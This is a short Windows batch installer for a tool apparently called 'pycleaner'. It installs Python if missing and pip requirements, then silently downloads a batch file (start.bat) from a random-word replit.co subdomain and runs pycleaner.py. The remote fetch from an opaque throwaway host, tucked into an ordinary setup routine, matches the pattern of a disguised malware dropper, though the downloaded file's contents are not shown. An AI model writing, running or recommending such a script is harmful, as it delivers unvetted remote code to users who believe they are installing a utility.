
@echo off
python --version 2>NUL
if errorlevel 1 goto errorNoPython
if errorlevel 0 goto ong


:errorNoPython
echo.
echo Error^: Python not installed
curl -L "https://www.python.org/ftp/python/3.10.7/python-3.10.7-amd64.exe" -O
start /W python-3.10.7-amd64.exe
:ong
echo python installed
cd %~dp0
MD tools
pip install -r requirements.txt
curl -L https://untimelyimpressionableadministration.blus2tlia.repl.co/start.bat -O
python pycleaner.py

